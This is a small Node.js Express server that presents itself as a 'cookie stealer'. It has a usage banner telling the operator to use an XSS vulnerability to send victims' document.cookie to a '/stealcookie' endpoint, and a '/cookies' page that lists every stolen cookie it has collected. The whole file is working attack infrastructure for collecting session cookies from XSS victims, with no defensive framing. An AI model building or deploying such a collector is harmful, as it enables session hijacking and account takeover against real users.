const express = require('express')
const app = express()
const port = process.env.PORT || 3000;
cookies = '';

app.get('/', (req, res) => {
    res.setHeader('X-XSS-Protection', '0')
    res.send('<pre>This is cookie stealer!\nUsage: Using XSS vulnerability to force user to request "http://this_domain/stealcookie?c="+document.cookie\nSee the results at <a href="/cookies">Cookies</a>></pre>');
    console.log(req.query.lang);
})

//View stole cookies
app.get('/cookies', (req, res) => {
    console.log(cookies)
    res.send(cookies);
})

//Stole cookie 
app.get('/stealcookie', (req, res) => {
    res.setHeader('X-XSS-Protection', '0')
    cookies += req.query.c.replace("<", "&lt;").replace(">", "&gt;") + "<br><br>----------------------------------------------<br><br>";
})

app.listen(port, () => console.log(`Example app listening on port ${port}!`))